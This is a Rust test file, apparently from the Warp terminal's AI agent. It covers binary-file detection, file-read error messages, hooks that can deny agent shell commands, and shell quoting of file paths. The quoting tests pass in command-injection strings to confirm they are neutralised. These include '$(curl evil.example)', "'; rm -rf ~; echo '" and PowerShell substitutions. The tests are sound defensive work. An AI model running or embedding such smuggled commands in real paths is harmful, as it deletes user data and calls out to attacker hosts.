mod binary_detection {
    use std::io::Write as _;

    use async_io::block_on;
    use tempfile::TempDir;

    use super::super::{is_file_content_binary_async, should_read_as_binary};

    fn write_file(dir: &TempDir, name: &str, contents: &[u8]) -> std::path::PathBuf {
        let path = dir.path().join(name);
        let mut file = std::fs::File::create(&path).expect("create temp file");
        file.write_all(contents).expect("write temp file");
        file.flush().expect("flush temp file");
        path
    }

    #[test]
    fn text_file_with_known_extension_is_not_binary() {
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "script.sh", b"#!/usr/bin/env bash\necho hi\n");
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn binary_file_with_known_extension_is_binary() {
        let dir = TempDir::new().expect("create tempdir");
        // Known binary extension — should be classified as binary without
        // needing content inspection.
        let path = write_file(&dir, "image.png", b"not really a png but extension wins\n");
        assert!(block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn extensionless_shell_script_is_not_binary() {
        // Regression test for QUALITY-507: an extensionless shell script (e.g.
        // `script/linux/bundle`) was being classified as binary solely because
        // its basename isn't in the known extensionless-text allow-list.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(
            &dir,
            "bundle",
            b"#!/usr/bin/env bash\n#\n# Builds a Warp binary and bundles it up for distribution.\n\nset -e\n",
        );
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn extensionless_binary_content_is_binary() {
        // An extensionless file whose contents are actually binary should fall
        // through the content-based check and be classified as binary.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(
            &dir,
            "payload",
            // NUL byte is a strong binary signal for content_inspector.
            &[0u8, 1, 2, 3, b'A', 0, 0, 0, 0xFF, 0xFE, 0xFD],
        );
        assert!(block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn extensionless_text_allowlisted_is_not_binary() {
        // Files whose basenames are in the known text allow-list (e.g. README)
        // should take the fast path and skip content inspection.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "README", b"Hello, world!\n");
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn empty_extensionless_file_is_not_binary() {
        // `content_inspector` treats an empty buffer as text, which is the
        // desired behavior for `read_files`: an empty file should be
        // surfaced to the agent as an empty string, not as zero binary bytes.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "empty", b"");
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn missing_extensionless_file_is_classified_as_binary() {
        // When an extensionless file cannot be opened during content
        // inspection, `should_read_as_binary` must route to the binary path
        // so the binary reader can produce a consistent `Missing` result.
        let dir = TempDir::new().expect("create tempdir");
        let missing = dir.path().join("does-not-exist");
        assert!(block_on(should_read_as_binary(&missing)));
    }

    #[test]
    fn missing_file_helper_is_classified_as_binary() {
        // Direct coverage of the low-level helper: opening a non-existent
        // path must return `true` so the caller doesn't accidentally try the
        // text path on an unreadable file.
        let dir = TempDir::new().expect("create tempdir");
        let missing = dir.path().join("does-not-exist");
        assert!(block_on(is_file_content_binary_async(&missing)));
    }
}

mod read_file_failures {
    use std::io::Write as _;

    use async_io::block_on;
    use tempfile::TempDir;

    use super::super::{describe_failed_files, read_local_file_context};
    use crate::ai::agent::{FileLocations, ReadFilesFailedFile};

    fn write_file(dir: &TempDir, name: &str, contents: &[u8]) -> String {
        let path = dir.path().join(name);
        let mut file = std::fs::File::create(&path).expect("create temp file");
        file.write_all(contents).expect("write temp file");
        file.flush().expect("flush temp file");
        path.to_string_lossy().to_string()
    }

    fn location(path: &str) -> FileLocations {
        FileLocations {
            name: path.to_string(),
            lines: vec![],
        }
    }

    #[test]
    fn oversized_binary_file_reports_too_large_not_missing() {
        // Regression for APP-4882: an existing binary file over the per-file
        // limit was reported as "do not exist" instead of "too large".
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "big.png", &vec![0u8; 1_500_000]);

        let result = block_on(read_local_file_context(
            &[location(&path)],
            None,
            None,
            None,
            None,
        ))
        .expect("read_local_file_context");

        assert!(result.file_contexts.is_empty());
        assert_eq!(result.failed_files.len(), 1);
        let message = &result.failed_files[0].message;
        assert!(message.contains("too large to read"), "got: {message}");
        assert!(message.contains("1.5 MB"), "got: {message}");
        assert!(message.contains("1.0 MB limit"), "got: {message}");
        assert!(!message.contains("does not exist"), "got: {message}");
    }

    #[test]
    fn missing_file_reports_does_not_exist() {
        let dir = TempDir::new().expect("create tempdir");
        let missing = dir.path().join("nope.txt").to_string_lossy().to_string();

        let result = block_on(read_local_file_context(
            &[location(&missing)],
            None,
            None,
            None,
            None,
        ))
        .expect("read_local_file_context");

        assert!(result.file_contexts.is_empty());
        assert_eq!(result.failed_files.len(), 1);
        assert_eq!(result.failed_files[0].message, "File does not exist");
    }

    #[test]
    fn unprocessable_image_reports_processing_failure() {
        // An image-typed file with invalid bytes (under the size limit) fails
        // image processing and must be distinct from "too large"/"do not exist".
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "broken.png", b"definitely not a valid PNG image");

        let result = block_on(read_local_file_context(
            &[location(&path)],
            None,
            None,
            None,
            None,
        ))
        .expect("read_local_file_context");

        assert!(result.file_contexts.is_empty());
        assert_eq!(result.failed_files.len(), 1);
        let message = &result.failed_files[0].message;
        assert!(
            message.contains("could not be processed as an image"),
            "got: {message}"
        );
        assert!(!message.contains("too large"), "got: {message}");
        assert!(!message.contains("does not exist"), "got: {message}");
    }

    #[test]
    fn describe_failed_files_groups_each_reason_per_file() {
        let failures = vec![
            ReadFilesFailedFile {
                path: "/tmp/gone.txt".to_string(),
                message: "File does not exist".to_string(),
            },
            ReadFilesFailedFile {
                path: "/tmp/huge.png".to_string(),
                message: "File is too large to read (3.5 MB > 1.0 MB limit). Downscale/compress it or read a smaller copy.".to_string(),
            },
            ReadFilesFailedFile {
                path: "/tmp/broken.png".to_string(),
                message: "File could not be processed as an image: bad header".to_string(),
            },
        ];

        let summary = describe_failed_files(&failures);

        assert!(
            summary.contains("/tmp/gone.txt: File does not exist"),
            "got: {summary}"
        );
        assert!(
            summary.contains("/tmp/huge.png: File is too large to read"),
            "got: {summary}"
        );
        assert!(
            summary
                .contains("/tmp/broken.png: File could not be processed as an image: bad header"),
            "got: {summary}"
        );
    }
}

mod hooks {
    use std::cell::RefCell;
    use std::rc::Rc;
    use std::sync::Arc;
    use std::time::Duration;

    use ai::agent::action_result::RequestCommandOutputResult;
    use ai::hooks::test_util::{ScriptedRunner, test_binding, test_source_id};
    use ai::hooks::{HookBoundary, HookNoticeKind};
    use parking_lot::FairMutex;
    use warp_multi_agent_api::{self as api};
    use warpui::r#async::Timer;
    use warpui::{App, ModelHandle};

    use super::super::{
        BlocklistAIActionExecutor, BlocklistAIActionExecutorEvent, NotExecutedReason,
        TryExecuteResult,
    };
    use crate::ai::agent::conversation::AIConversationId;
    use crate::ai::agent::{AIAgentAction, AIAgentActionResultType};
    use crate::ai::blocklist::RecordingController;
    use crate::ai::blocklist::hooks::pre_tool::{PreToolHookState, cached_state};
    use crate::ai::blocklist::hooks::testing::{
        HookTestApp, hook_test_app, init_project_action, settle, shell_action,
    };
    use crate::ai::blocklist::hooks::{pre_tool, tool_result};
    use crate::ai::get_relevant_files::controller::GetRelevantFilesController;
    use crate::features::FeatureFlag;
    use crate::terminal::model::terminal_model::TerminalModel;
    use crate::workspaces::user_workspaces::UserWorkspaces;

    /// Executor events in the order they were emitted, reduced to strings so sequences can be
    /// compared across runs.
    type EventLog = Rc<RefCell<Vec<String>>>;

    fn build_executor(
        app: &mut App,
        harness: &HookTestApp,
    ) -> (ModelHandle<BlocklistAIActionExecutor>, EventLog) {
        if !app.read(|ctx| ctx.has_singleton_model::<RecordingController>()) {
            app.add_singleton_model(|_| RecordingController::new());
        }
        let terminal_model = Arc::new(FairMutex::new(TerminalModel::mock(None, None)));
        let get_relevant_files = app.add_model(|_| GetRelevantFilesController::default());
        let active_session = harness.active_session.clone();
        let dispatcher = harness.dispatcher.clone();
        let terminal_view_id = harness.terminal_view_id;
        let executor = app.add_model(|ctx| {
            BlocklistAIActionExecutor::new(
                terminal_model,
                active_session,
                &dispatcher,
                get_relevant_files,
                terminal_view_id,
                UserWorkspaces::teamless_context_resolver_for_test(),
                ctx,
            )
        });
        let events: EventLog = Rc::new(RefCell::new(Vec::new()));
        let log = events.clone();
        app.update(|ctx| {
            ctx.subscribe_to_model(&executor, move |_, event, _| {
                let line = match event {
                    BlocklistAIActionExecutorEvent::ExecutingAction { action_id } => {
                        format!("executing:{action_id}")
                    }
                    BlocklistAIActionExecutorEvent::FinishedAction { result, .. } => {
                        format!("finished:{}:{}", result.id, result_kind(&result.result))
                    }
                    BlocklistAIActionExecutorEvent::HookVerdictResolved {
                        action_id,
                        is_user_initiated,
                        ..
                    } => format!("verdict:{action_id}:{is_user_initiated}"),
                    BlocklistAIActionExecutorEvent::InitProject(action_id) => {
                        format!("init_project:{action_id}")
                    }
                    BlocklistAIActionExecutorEvent::OpenCodeReview(action_id) => {
                        format!("open_code_review:{action_id}")
                    }
                    BlocklistAIActionExecutorEvent::InsertCodeReviewComments {
                        action_id, ..
                    } => format!("insert_comments:{action_id}"),
                };
                log.borrow_mut().push(line);
            });
        });
        (executor, events)
    }

    fn result_kind(result: &AIAgentActionResultType) -> String {
        match result {
            AIAgentActionResultType::RequestCommandOutput(
                RequestCommandOutputResult::HookDenied { command, reason },
            ) => format!("hook_denied({command};{reason})"),
            AIAgentActionResultType::RequestCommandOutput(result) => {
                format!("shell:{result}")
            }
            AIAgentActionResultType::InitProject => "init_project".to_owned(),
            other => format!("{other}"),
        }
    }

    /// Event lines with the action id removed, for comparing two runs of different actions.
    fn shapes(events: &EventLog, action: &AIAgentAction) -> Vec<String> {
        let id = action.id.to_string();
        events
            .borrow()
            .iter()
            .filter(|line| line.contains(&id))
            .map(|line| line.replace(&id, "<id>"))
            .collect()
    }

    fn try_execute(
        app: &mut App,
        executor: &ModelHandle<BlocklistAIActionExecutor>,
        action: &AIAgentAction,
        conversation_id: AIConversationId,
        is_user_initiated: bool,
    ) -> TryExecuteResult {
        executor.update(app, |executor, ctx| {
            executor.try_to_execute_action(action.clone(), conversation_id, is_user_initiated, ctx)
        })
    }

    fn reason_of(result: &TryExecuteResult) -> Option<NotExecutedReason> {
        match result {
            TryExecuteResult::NotExecuted { reason, .. } => Some(*reason),
            TryExecuteResult::ExecutedSync | TryExecuteResult::ExecutedAsync => None,
        }
    }

    fn install_shell_binding(harness: &HookTestApp, app: &mut App, stdout: &str, exit: i32) {
        let binding = test_binding(test_source_id("s"), HookBoundary::ToolPre, 0, Some("Shell"));
        harness
            .hooks
            .runner
            .script(binding.id.clone(), ScriptedRunner::exit_with(exit, stdout));
        app.update(|ctx| harness.hooks.install_bindings(vec![binding], ctx));
    }

    async fn let_background_work_settle(app: &mut App) {
        for _ in 0..10 {
            Timer::after(Duration::from_millis(5)).await;
            app.update(|_| {});
        }
    }

    #[test]
    fn with_the_flag_off_hooks_are_never_consulted() {
        App::test((), |mut app| async move {
            let harness = hook_test_app(&mut app);
            install_shell_binding(&harness, &mut app, "denied", 2);
            let (executor, events) = build_executor(&mut app, &harness);

            let shell = shell_action("id-shell", "ls");
            let result = try_execute(&mut app, &executor, &shell, harness.conversation_id, false);
            assert_eq!(
                reason_of(&result),
                Some(NotExecutedReason::NeedsConfirmation)
            );

            let init = init_project_action("id-init");
            let result = try_execute(&mut app, &executor, &init, harness.conversation_id, false);
            assert!(matches!(result, TryExecuteResult::ExecutedSync));
            assert_eq!(
                shapes(&events, &init),
                vec![
                    "init_project:<id>",
                    "executing:<id>",
                    "finished:<id>:init_project"
                ]
            );

            let_background_work_settle(&mut app).await;
            assert_eq!(harness.hooks.adapter.encoded_count(), 0);
            assert_eq!(harness.hooks.runner.invocation_count(), 0);
            assert!(app.read(|ctx| cached_state(&shell.id, ctx)).is_none());
            assert!(app.read(|ctx| tool_result::observed_terminal_results(ctx).is_empty()));
        });
    }

    #[test]
    fn with_the_flag_on_and_an_empty_registry_events_match_the_flag_off_run() {
        App::test((), |mut app| async move {
            let harness = hook_test_app(&mut app);
            let (executor, events) = build_executor(&mut app, &harness);

            let init_off = init_project_action("id-init-off");
            let shell_off = shell_action("id-shell-off", "ls");
            let init_off_result = try_execute(
                &mut app,
                &executor,
                &init_off,
                harness.conversation_id,
                false,
            );
            let shell_off_result = try_execute(
                &mut app,
                &executor,
                &shell_off,
                harness.conversation_id,
                false,
            );

            let _flag = FeatureFlag::AgentHooks.override_enabled(true);
            let init_on = init_project_action("id-init-on");
            let shell_on = shell_action("id-shell-on", "ls");
            let init_on_result = try_execute(
                &mut app,
                &executor,
                &init_on,
                harness.conversation_id,
                false,
            );
            let shell_on_result = try_execute(
                &mut app,
                &executor,
                &shell_on,
                harness.conversation_id,
                false,
            );

            assert!(matches!(init_off_result, TryExecuteResult::ExecutedSync));
            assert!(matches!(init_on_result, TryExecuteResult::ExecutedSync));
            assert_eq!(shapes(&events, &init_off), shapes(&events, &init_on));
            assert_eq!(reason_of(&shell_off_result), reason_of(&shell_on_result));
            assert_eq!(shapes(&events, &shell_off), shapes(&events, &shell_on));

            let_background_work_settle(&mut app).await;
            assert_eq!(harness.hooks.adapter.encoded_count(), 0);
            assert!(app.read(|ctx| tool_result::observed_terminal_results(ctx).is_empty()));
        });
    }

    fn run_scripted_deny(is_user_initiated: bool) {
        App::test((), move |mut app| async move {
            let _flag = FeatureFlag::AgentHooks.override_enabled(true);
            let harness = hook_test_app(&mut app);
            install_shell_binding(&harness, &mut app, "rm is not allowed here", 2);
            let (executor, events) = build_executor(&mut app, &harness);
            let shell = shell_action("id-shell", "rm -rf build");

            let first = try_execute(
                &mut app,
                &executor,
                &shell,
                harness.conversation_id,
                is_user_initiated,
            );
            assert_eq!(reason_of(&first), Some(NotExecutedReason::WaitingOnHooks));
            assert!(matches!(
                app.read(|ctx| cached_state(&shell.id, ctx)),
                Some(PreToolHookState::Pending)
            ));

            let verdict_line = format!("verdict:{}:{is_user_initiated}", shell.id);
            settle(&mut app, |_| {
                events.borrow().iter().any(|l| l == &verdict_line)
            })
            .await;
            assert!(matches!(
                app.read(|ctx| cached_state(&shell.id, ctx)),
                Some(PreToolHookState::Resolved(_))
            ));
            assert_eq!(
                shapes(&events, &shell),
                vec![format!("verdict:<id>:{is_user_initiated}")],
                "nothing executes until the action is tried again"
            );

            let second = try_execute(
                &mut app,
                &executor,
                &shell,
                harness.conversation_id,
                is_user_initiated,
            );
            assert!(matches!(second, TryExecuteResult::ExecutedSync));
            assert_eq!(
                shapes(&events, &shell),
                vec![
                    format!("verdict:<id>:{is_user_initiated}"),
                    "executing:<id>".to_owned(),
                    "finished:<id>:hook_denied(rm -rf build;rm is not allowed here)".to_owned(),
                ]
            );

            let observed = app.read(tool_result::observed_terminal_results);
            assert_eq!(observed.len(), 1);
            assert_eq!(observed[0].action_id, shell.id);
            assert_eq!(observed[0].boundary, HookBoundary::ToolFailure);

            let notices = harness.hooks.messenger.notices();
            assert_eq!(notices.len(), 1);
            assert_eq!(notices[0].kind, HookNoticeKind::Denied);
            assert_eq!(notices[0].text, "rm is not allowed here");

            let wire = api::request::input::tool_call_result::Result::try_from(
                RequestCommandOutputResult::HookDenied {
                    command: "rm -rf build".to_owned(),
                    reason: "rm is not allowed here".to_owned(),
                },
            )
            .expect("hook denials reach the wire");
            let api::request::input::tool_call_result::Result::RunShellCommand(shell_result) = wire
            else {
                panic!("expected a shell result");
            };
            let Some(api::run_shell_command_result::Result::PermissionDenied(denied)) =
                shell_result.result
            else {
                panic!("expected a permission denied result");
            };
            assert_eq!(
                denied.reason,
                Some(api::permission_denied::Reason::HookDenied(
                    api::permission_denied::HookDenied {
                        reason: "rm is not allowed here".to_owned(),
                    }
                ))
            );
        });
    }

    #[test]
    fn a_scripted_deny_finishes_the_shell_action_with_hook_denied() {
        run_scripted_deny(false);
    }

    #[test]
    fn a_scripted_deny_still_denies_a_user_initiated_action() {
        run_scripted_deny(true);
    }

    #[test]
    fn allow_and_no_opinion_leave_warps_own_decision_in_place() {
        App::test((), |mut app| async move {
            let harness = hook_test_app(&mut app);
            let (executor, events) = build_executor(&mut app, &harness);

            // Baselines without hooks: the shell needs confirmation, project init runs.
            let shell_baseline = reason_of(&try_execute(
                &mut app,
                &executor,
                &shell_action("id-shell-baseline", "ls"),
                harness.conversation_id,
                false,
            ));
            assert_eq!(shell_baseline, Some(NotExecutedReason::NeedsConfirmation));
            assert!(matches!(
                try_execute(
                    &mut app,
                    &executor,
                    &init_project_action("id-init-baseline"),
                    harness.conversation_id,
                    false,
                ),
                TryExecuteResult::ExecutedSync
            ));

            let _flag = FeatureFlag::AgentHooks.override_enabled(true);
            let source = test_source_id("s");
            let allow_shell = test_binding(source.clone(), HookBoundary::ToolPre, 0, Some("Shell"));
            let silent_all = test_binding(source, HookBoundary::ToolPre, 1, None);
            harness.hooks.runner.script(
                allow_shell.id.clone(),
                ScriptedRunner::exit_with(0, r#"{"verdict":"allow"}"#),
            );
            harness
                .hooks
                .runner
                .script(silent_all.id.clone(), ScriptedRunner::exit_with(0, ""));
            app.update(|ctx| {
                harness
                    .hooks
                    .install_bindings(vec![allow_shell, silent_all], ctx)
            });

            // Allow on an action Warp would not auto-run: Warp still asks.
            let shell = shell_action("id-shell", "ls");
            let first = try_execute(&mut app, &executor, &shell, harness.conversation_id, false);
            assert_eq!(reason_of(&first), Some(NotExecutedReason::WaitingOnHooks));
            let line = format!("verdict:{}:false", shell.id);
            settle(&mut app, |_| events.borrow().iter().any(|l| l == &line)).await;
            let second = try_execute(&mut app, &executor, &shell, harness.conversation_id, false);
            assert_eq!(reason_of(&second), shell_baseline);

            // The same cached verdict with user approval: Warp runs it, as it would without hooks.
            let third = try_execute(&mut app, &executor, &shell, harness.conversation_id, true);
            assert!(matches!(third, TryExecuteResult::ExecutedAsync));
            assert_eq!(
                harness.hooks.adapter.encoded_count(),
                2,
                "both bindings ran once; the verdict was reused afterwards"
            );

            // No opinion on an action Warp auto-runs: it runs.
            let init = init_project_action("id-init");
            let first = try_execute(&mut app, &executor, &init, harness.conversation_id, false);
            assert_eq!(reason_of(&first), Some(NotExecutedReason::WaitingOnHooks));
            let line = format!("verdict:{}:false", init.id);
            settle(&mut app, |_| events.borrow().iter().any(|l| l == &line)).await;
            let second = try_execute(&mut app, &executor, &init, harness.conversation_id, false);
            assert!(matches!(second, TryExecuteResult::ExecutedSync));
            assert!(
                events
                    .borrow()
                    .iter()
                    .any(|l| l == &format!("finished:{}:init_project", init.id))
            );
        });
    }

    #[test]
    fn cancelling_the_conversation_drops_a_verdict_that_arrives_afterwards() {
        App::test((), |mut app| async move {
            let _flag = FeatureFlag::AgentHooks.override_enabled(true);
            let harness = hook_test_app(&mut app);
            install_shell_binding(&harness, &mut app, "denied", 2);
            let (executor, events) = build_executor(&mut app, &harness);
            let gate = harness.hooks.runner.hold();
            let shell = shell_action("id-shell", "ls");

            let first = try_execute(&mut app, &executor, &shell, harness.conversation_id, false);
            assert_eq!(reason_of(&first), Some(NotExecutedReason::WaitingOnHooks));
            settle(&mut app, |_| harness.hooks.runner.invocation_count() == 1).await;
            let cancel = app
                .read(|ctx| pre_tool::cancel_flag(&shell.id, ctx))
                .expect("the dispatch has a cancel flag");

            app.update(|ctx| pre_tool::cancel_all_for_conversation(harness.conversation_id, ctx));
            assert!(cancel.load(std::sync::atomic::Ordering::Acquire));

            gate.release();
            let_background_work_settle(&mut app).await;
            assert!(app.read(|ctx| cached_state(&shell.id, ctx)).is_none());
            assert!(
                events.borrow().is_empty(),
                "no verdict event and no execution after cancellation: {:?}",
                events.borrow()
            );
            assert!(app.read(|ctx| tool_result::observed_terminal_results(ctx).is_empty()));
        });
    }
}

mod path_shell_quoting {
    use super::super::{build_is_file_path_command, build_is_git_repository_command};
    use crate::terminal::shell::ShellType;

    #[test]
    fn is_file_path_quotes_posix_path_as_single_argument() {
        let command = build_is_file_path_command("/tmp/repo path/file.rs", ShellType::Bash);

        assert_eq!(command, "test -f '/tmp/repo path/file.rs'");
    }

    #[test]
    fn is_file_path_neutralizes_posix_substitutions() {
        let command =
            build_is_file_path_command("/tmp/x$(touch /tmp/warp-poc)`id`", ShellType::Bash);

        assert_eq!(command, "test -f '/tmp/x$(touch /tmp/warp-poc)`id`'");
    }

    #[test]
    fn is_file_path_neutralizes_embedded_quote_posix() {
        let command = build_is_file_path_command("/tmp/foo'; rm -rf ~; echo '", ShellType::Bash);

        assert_eq!(command, r#"test -f '/tmp/foo'"'"'; rm -rf ~; echo '"'"''"#);
    }

    #[test]
    fn is_file_path_quotes_powershell_path_as_single_argument() {
        let command =
            build_is_file_path_command(r#"C:\Users\me\file path.rs"#, ShellType::PowerShell);

        assert_eq!(
            command,
            r#"if (Test-Path -PathType Leaf 'C:\Users\me\file path.rs') { exit 0 } else { exit 1 }"#
        );
    }

    #[test]
    fn is_file_path_neutralizes_powershell_substitutions() {
        let command = build_is_file_path_command(
            r#"C:\tmp\x$(New-Item C:\poc)$env:USERPROFILE"#,
            ShellType::PowerShell,
        );

        assert_eq!(
            command,
            r#"if (Test-Path -PathType Leaf 'C:\tmp\x$(New-Item C:\poc)$env:USERPROFILE') { exit 0 } else { exit 1 }"#
        );
    }

    #[test]
    fn is_file_path_neutralizes_fish_embedded_quote() {
        let command = build_is_file_path_command("/tmp/owner's file", ShellType::Fish);

        assert_eq!(command, r"test -f '/tmp/owner\'s file'");
    }

    #[test]
    fn is_git_repository_quotes_posix_path_as_single_argument() {
        let command = build_is_git_repository_command("/tmp/repo path", ShellType::Zsh);

        assert_eq!(command, "git -C '/tmp/repo path' rev-parse");
    }

    #[test]
    fn is_git_repository_neutralizes_posix_substitutions() {
        let command =
            build_is_git_repository_command("/tmp/x$(curl evil.example)`id`", ShellType::Bash);

        assert_eq!(command, "git -C '/tmp/x$(curl evil.example)`id`' rev-parse");
    }

    #[test]
    fn is_git_repository_neutralizes_embedded_quote_posix() {
        let command =
            build_is_git_repository_command("/tmp/foo'; rm -rf ~; echo '", ShellType::Bash);

        assert_eq!(
            command,
            r#"git -C '/tmp/foo'"'"'; rm -rf ~; echo '"'"'' rev-parse"#
        );
    }

    #[test]
    fn is_git_repository_neutralizes_powershell_substitutions() {
        let command = build_is_git_repository_command(
            r#"C:\repo$(New-Item C:\poc)$env:USERPROFILE"#,
            ShellType::PowerShell,
        );

        assert_eq!(
            command,
            r#"git -C 'C:\repo$(New-Item C:\poc)$env:USERPROFILE' rev-parse"#
        );
    }
}
